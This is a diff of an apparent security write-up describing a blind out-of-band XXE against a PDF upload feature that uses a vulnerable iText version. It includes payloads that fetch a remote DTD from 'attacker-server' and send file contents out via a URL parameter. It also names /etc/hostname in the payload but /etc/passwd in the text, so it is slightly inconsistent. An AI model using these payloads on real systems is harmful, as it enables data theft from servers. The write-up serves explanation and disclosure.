@@ -71,7 +71,9 @@ So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of 
 
 Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.
 
-I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with a working payload: 
+I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with two working payloads:
+
+### 1st. payload:
 
 ```xml
 <!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
@@ -91,7 +93,7 @@ The first payload is what I inserted in the PDF file:
 
 At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
 
-The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
+The <b>poc.dtd</b> file (2nd. payload), hosted on the attacker's server, contains the actual exfiltration code:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
@@ -102,9 +104,9 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
 
-Back in the initial payload:
+Back to the 1st. payload:
 
-5. `%ent;`: This line (3rd) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into play, setting up the last step of the attack.
+5. `%ent;`: This line (#3) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into play, setting up the last step of the attack.
 
 6. `<root>&data;</root>`: The parser now resolves the `&data;` general entity. This triggers a final HTTP request to `https://attacker-server`. The content of the `/etc/passwd` file is appended as a URL parameter (`?x=%file;`), and the server sends this request successfully exfiltrating the data to the attacker's controlled domain.
 
